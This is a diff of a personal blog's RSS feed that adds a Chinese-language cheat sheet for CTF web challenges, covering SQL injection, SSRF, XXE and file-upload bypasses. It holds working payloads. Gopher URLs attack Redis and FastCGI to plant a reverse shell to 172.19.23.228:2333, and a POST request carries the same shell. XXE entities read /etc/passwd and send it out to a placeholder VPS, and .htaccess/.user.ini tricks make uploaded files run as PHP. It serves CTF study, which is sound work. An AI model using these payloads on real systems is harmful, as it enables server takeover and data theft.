@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Mon, 16 Mar 2020 17:30:24 +0800</lastBuildDate>
+        <lastBuildDate>Tue, 17 Mar 2020 16:45:08 +0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss+xml" href="https://ajatars.github.io/rss.xml" />
         
@@ -87,6 +87,7 @@
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
                     <description><![CDATA[<hr>
+<p>​					CTF web的一些总结与备忘。</p>
 <blockquote>
 <ul>
 <li><a href="#1php%E7%9B%B8%E5%85%B3">1.PHP相关</a>
@@ -105,7 +106,37 @@
 <ul>
 <li><a href="#21-nginx">2.1 nginx</a></li>
 <li><a href="#22-apache">2.2 apache</a></li>
-<li><a href="#23-bash">2.3 bash文件</a></li>
+<li><a href="#23-bash%E6%96%87%E4%BB%B6">2.3 bash文件</a></li>
+<li><a href="#24-proc%E6%96%87%E4%BB%B6">2.4 proc文件</a></li>
+<li><a href="#23-dev%E6%96%87%E4%BB%B6">2.3 dev文件</a></li>
+</ul>
+</li>
+<li><a href="#3sql%E6%B3%A8%E5%85%A5">3.SQL注入</a>
+<ul>
+<li><a href="#31-mysql%E6%95%99%E7%A8%8B%E5%92%8C%E6%96%87%E6%A1%A3">3.1 MYSQL教程和文档</a></li>
+<li><a href="#32-%E5%AE%9E%E7%94%A8%E5%A5%BD%E6%96%87">3.2 实用好文</a></li>
+</ul>
+</li>
+<li><a href="#4ssrf">4.SSRF</a>
+<ul>
+<li><a href="#41-gopher%E7%9A%84%E4%BD%BF%E7%94%A8">4.1 gopher的使用</a></li>
+<li><a href="#42-ip%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87%E4%B8%8E%E7%99%BD%E5%90%8D%E5%8D%95">4.2 IP地址绕过与白名单</a></li>
+<li><a href="#43-unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">4.3 unicode编码绕过</a></li>
+</ul>
+</li>
+<li><a href="#5xxe">5.XXE</a>
+<ul>
+<li><a href="#51-%E5%B8%B8%E7%94%A8poc">5.1 常用poc</a></li>
+<li><a href="#52-%E4%B8%80%E4%BA%9B%E5%8D%8F%E8%AE%AE">5.2 一些协议</a></li>
+<li><a href="#53-oob%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">5.3 OOB读取文件</a></li>
+<li><a href="#54-%E6%9C%AC%E5%9C%B0xxe">5.4 本地xxe</a></li>
+</ul>
+</li>
+<li><a href="#6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">6.文件上传</a>
+<ul>
+<li><a href="#61-fuzz%E6%80%9D%E8%B7%AF">6.1 fuzz思路</a></li>
+<li><a href="#62-htaccess%E5%92%8C.user.ini">6.2 htaccess和.user.ini</a></li>
+<li><a href="#63-php/.%E5%86%99%E6%96%87%E4%BB%B6">6.3 php/.写文件</a></li>
 </ul>
 </li>
 </ul>
@@ -401,16 +432,295 @@ print(~&#34;和&#34;.encode(&#39;utf8&#39;)[2])
 .bash_logout 用户登出时执行的命令
 </code></pre><h4 id="24-proc文件">2.4 proc文件</h4>
 <p>linux 万物皆为文件，进程也不例外</p>
-<pre><code>/proc/self 链接到当前正在运行的进程
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-cmd" data-lang="cmd">/proc/self 链接到当前正在运行的进程
+
+/proc/self/fd 打开文件的文件描述符
 
 /proc/N/cwd 链接到进程当前工作目录
 
 如果是通过小马执行的程序，那么当前进程就是apache，组合一下self/cwd:
-proc/self/cwd/     =&gt;apache的工作目录
+proc/self/cwd/   apache的工作目录
 
-proc/pid/cmdline   =&gt;里面存储某个进程初始运行的命令,即启动时传递给kernel的参数信息
-</code></pre><p>CTF： <a href="https://blog.csdn.net/qq_38154820/article/details/103308985">2019高校运维赛misc2</a></p>
-]]></description>
+proc/pid/cmdline   命令行信息
+
+/proc/self/environ 环境变量信息
+</code></pre></td></tr></table>
+</div>
+</div><p>CTF： <a href="https://blog.csdn.net/qq_38154820/article/details/103308985">2019高校运维赛misc2</a></p>
+<h4 id="25-dev文件">2.5 dev文件</h4>
+<p><code>/dev/fd</code> 是<code>/proc/self/fd</code>的软连接</p>
+<hr>
+<h2 id="3sql注入">3.SQL注入</h2>
+<h4 id="31-mysql教程和文档">3.1 MYSQL教程和文档</h4>
+<p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">Mysql教程 | 菜鸟教程</a></p>
+<p><a href="https://dev.mysql.com/doc/">Mysql文档</a></p>
+<hr>
+<h4 id="32-实用好文">3.2 实用好文</h4>
+<p>本来已经写了好几个标题，但写基础没意思，一些比较新奇的trick又需要些基础。直接记录大佬的文章好了。</p>
+<p><a href="https://xz.aliyun.com/t/7169">对MYSQL注入相关内容及部分Trick的归类小结</a></p>
+<p>PDO场景下的注入，一般就两种，一种是模拟预处理(默认开启)下堆叠注入造成的，这种情况下的注入要是有过滤，可以使用16进制进行绕过，用SET方法设置一个全局变量值,再用预编译执行这个全局变量。另一种就是宽字节注入造成单引号转义。</p>
+<p><em><strong>当set被过滤</strong></em></p>
+<p>上面提到的是用<code>SET @hpdoger</code>来设置变量，如果select没被过滤的话，还可以用<code>select @hpdoger:=0x12312</code>来设置变量，详情见：(<a href="https://blog.csdn.net/JesseYoung/article/details/40779631">https://blog.csdn.net/JesseYoung/article/details/40779631</a>)</p>
+<p><em><strong>handler语句代替select查询</strong></em> (<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a>)</p>
+<p>过滤了in、or 造成无法查询库，表名的情况。</p>
+<p>没过滤in时</p>
+<p><code>select table_name from mysql.innodb_table_stats where database_name=database();</code></p>
+<p><code>sys系统库</code></p>
+<blockquote>
+<pre><code>#查询所有的库：
+SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
+SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
+#查询指定库的表（若无则说明此表从未被访问）：
+SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
+SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
+</code></pre></blockquote>
+<p>当库名查询到的时候，往往需要无列名注入，利用<code>union</code>来给未知列名“重命名”，或者<code>select</code>直接比较，<code>(select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {} limit 1)</code></p>
+<p><code>CAST('0' as json) </code>二进制比较，区分大小写。<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">新春战疫公益赛-ezsqli-出题小记</a></p>
+<p>UPDATE注入重复字段赋值,<code>UPDATE table_name set field1=new_value,field1=(select user()) [where]</code></p>
+<p>还有一些盲注，比如order by后的比较盲注，like，regexp匹配，regexp不分大小写。</p>
+<p>当比较常规的注入测试无果时，可以考虑下二次注入，约束攻击或者文件读/写，或许会有意想不到的收获。</p>
+<p>然后就是各种时间注入，布尔注入的脚本编写，时常练习下二分法也是不错的。</p>
+<hr>
+<h2 id="4ssrf">4.SSRF</h2>
+<h4 id="41-gopher的使用">4.1 gopher的使用</h4>
+<p>先推文章</p>
+<p><a href="https://yinwc.github.io/2018/07/31/Gopher/#%E6%94%BB%E5%87%BB-FastCGI">从一道CTF题看gopher协议的攻击面</a></p>
+<p><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL">Gopher SSRF攻击内网应用复现</a></p>
+<p>先用ssrf探测端口</p>
+<p>攻击mysql，3306，利用条件:读取到mysql账号密码</p>
+<p>结合<a href="https://github.com/undefinedd/extract0r-">工具</a>生成payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">ssrf_user</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;ssrf&#39;</span> <span class="o">-</span><span class="n">P</span> <span class="s1">&#39;SELECT * FROM ssrf.flag&#39;</span> <span class="o">-</span><span class="n">v</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>攻击Redis, 6379，利用条件:未授权访问</p>
+<p><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></p>
+<p>攻击FastCGI，9000</p>
+<p><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</code></p>
+<p>其他Vulnerablility web</p>
+<pre><code>POST /exp.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: curl/7.43.0
+Accept: */*
+Content-Length: 49
+Content-Type: application/x-www-form-urlencoded
+
+e=bash -i &gt;%26 /dev/tcp/172.19.23.228/2333 0&gt;%261
+</code></pre><pre><code>gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null
+</code></pre><hr>
+<h4 id="42-ip地址绕过与白名单">4.2 IP地址绕过与白名单</h4>
+<p>进制:</p>
+<pre><code>数字地址(十进制)：127.0.0.1-&gt;2130706433
+十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01
+八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01
+省略写法：127.0.0.1-&gt;127.1
+</code></pre><p>利用xio.io:</p>
+<pre><code>127.0.0.1.xip.io
+www.127.0.0.1.xip.io
+xxx.127.0.0.1.xip.io
+fuzz.xxx.127.0.0.1.xip.io
+</code></pre><p>用IPV6绕过：</p>
+<pre><code>http://[::ffff:127.0.0.1]/
+http://[::1]/
+</code></pre><p>绕过内网ip过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">$hostname=$url_parse[&#39;host&#39;]; 
+$ip=gethostbyname($hostname); 
+$int_ip=ip2long($ip);
+return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; 
+</code></pre></td></tr></table>
+</div>
+</div><pre><code>1. http://0.0.0.0/flag.php   0.0.0.0掩码绕过
+2. http://foo@127.0.0.1:80@baidu.com/flag.php  白名单是baidu.com，黑名单是127x网段
+3. http://%5B::%5D:22/ 绕过主机名探测，用[::]替代127.0.0.1
+4. data://baidu.com/plain;base64,xxxxxx  data://协议，php不关心MIME类型，所以可以把baidu.com放到MIME类型里
+5. file:///proc/self/cwd/index.php  file://协议+ proc进程读取 proc/net/arp arp表
+</code></pre><hr>
+<h4 id="43-unicode编码绕过">4.3 unicode编码绕过</h4>
+<pre><code>LocalHost = localhost = ⓛocaⓛhost 
+</code></pre><hr>
+<h2 id="5xxe">5.XXE</h2>
+<h4 id="51-常用poc">5.1 常用poc</h4>
+<p>外部实体:</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;
+</code></pre><p>参数实体:</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY %xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    %xxe;
+]&gt;
+</code></pre><p>两层嵌参数实体：几乎所有XML解析器能够发现如下这种两层嵌套式的</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myip/?%file;'&gt;&quot;&gt;
+    %start;
+    %send;
+]&gt;
+&lt;message&gt;10&lt;/message&gt;
+</code></pre><p>三层嵌套参数实体:无需引用外部dtd也可以实现Blind XXE</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ELEMENT message ANY&gt;
+    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;
+    &lt;!ENTITY % para '
+        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;para2;
+    '&gt;
+    %para;
+]&gt;
+&lt;message&gt;10&lt;/message&gt;
+</code></pre><p>utf-7:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot;?&gt;
++ADwAIQ-DOCTYPE ANY +AFs-
+    +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
++AF0APg-
++ADw-x+AD4AJg-f+ADsAPA-/x+AD4-
+EOD;
+</code></pre><p>xinclude:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+ &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;
+&lt;/root&gt;
+</code></pre><p>xslt:</p>
+<p><a href="https://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9"> 从sql注入到xslt再到xxe的一道ctf题目</a></p>
+<p>文章:</p>
+<p><a href="https://xz.aliyun.com/t/6829#toc-4">PHP与JAVA之XXE漏洞详解与审计</a></p>
+<p><a href="https://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/">浅析xml之xinclude &amp; xslt</a></p>
+<hr>
+<h4 id="52-一些协议">5.2 一些协议</h4>
+<p>php:</p>
+<p><code>php://filter/read=convert.base64-encode/resource=file://flag.php</code></p>
+<p><code>php://filter/read=convert.base64-encode/resource=phar://xxx.jpg</code></p>
+<p>java:</p>
+<p><code>netdoc://flag.php</code></p>
+<p>file、netdoc 不仅可以读文件内容，还可以读目录。</p>
+<hr>
+<h4 id="53-oob读取文件">5.3 OOB读取文件</h4>
+<p>vps上部署DTD文件,eval.dtd</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///ect/passwd&quot;&gt;
+
+&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM 'http://your_vps/?file=%file;'&gt;&quot;&gt;
+</code></pre><p>POST:</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % send SYSTEM 'http://your_vps/test2.dtd'&gt;
+
+%send;
+%test;
+%back;
+]&gt;
+</code></pre><hr>
+<h4 id="54-本地xxe">5.4 本地xxe</h4>
+<p>dtd-1:</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY % ISOamso '
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;send;
+    '&gt; 
+    %remote;
+]&gt;
+</code></pre><p>javaweb 的本地xxe</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;
+
+    &lt;!ENTITY % expr 'aaa)&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///FILE_TO_READ&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        &lt;!ELEMENT aa (bb'&gt;
+
+    %local_dtd;
+]&gt;
+&lt;message&gt;&lt;/message&gt;
+</code></pre><p><a href="https://xz.aliyun.com/t/5503">https://xz.aliyun.com/t/5503</a></p>
+<p><a href="https://www.jishuwen.com/d/2EGU">https://www.jishuwen.com/d/2EGU</a></p>
+<hr>
+<h2 id="6文件上传">6.文件上传</h2>
+<h4 id="61-fuzz思路">6.1 fuzz思路</h4>
+<p>1.content-type 检测，改图片后缀</p>
+<p>2.检测文件头，使用<code>getimagesize()</code>函数来获取文件的MIME类型</p>
+<pre><code>gif(GIF89a) : 47 49 46 38 39 61
+jpg、jpeg : FF D8 FF
+png : 89 50 4E 47 0D 0A
+</code></pre><p>3.黑名单检测</p>
+<pre><code>大小写判断 （如将php改为pHp等）
+特殊扩展名来绕过（如php可以使用php3、php4、php5等来代替）
+</code></pre><p>4.白名单检测</p>
+<pre><code>使用%00截断文件名来上传（后面会讲）
+如果目标还存在文件包含漏洞，那么就可以上传图片马再文件包含来拿shell
+</code></pre><p>5.图片二次渲染</p>
+<p><a href="https://secgeek.net/bookfresh-vulnerability/">BookFresh Tricky File Upload Bypass to RCE</a>](<a href="https://secgeek.net/bookfresh-vulnerability/">https://secgeek.net/bookfresh-vulnerability/</a>)</p>
+<p>6.解析漏洞</p>
+<p>Apache</p>
+<pre><code>a.php.xxx
+CVE-2017-15715 a.php\x0A
+</code></pre><p>7.%00 截断</p>
+<pre><code>PHP &lt; 5.3.4
+magic_quotes_gpc 关闭
+</code></pre><p>8.多文件上传</p>
+<p>文章:</p>
+<p><a href="https://xz.aliyun.com/t/6047#toc-1">浅谈常见的文件上传的检测方式与绕过方法</a></p>
+<hr>
+<h4 id="62-htaccess和userini">6.2 htaccess和.user.ini</h4>
+<p>1.htaccess</p>
+<p>apache中的.htaccess</p>
+<p>将同目录下的jpg解析为php,文件内容如下</p>
+<pre><code>AddType application/x-httpd-php .jpg
+</code></pre><p><a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">PHP htaccess injection cheat sheet</a></p>
+<p>2..user.ini</p>
+<p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。</p>
+<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门</a></p>
+<p>当一个文件夹下有php</p>
+<pre><code>php_value auto_prepend_file = f13g.php
+</code></pre><hr>
+<h4 id="62-php写文件">6.2 php/.写文件</h4>
+<p>后缀给<code>php/.</code>，在函数操作的时候也可以存为php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">copy()、file_get_contents()、move_uploaded_file()
+</code></pre></td></tr></table>
+</div>
+</div>]]></description>
                 
                 
                 
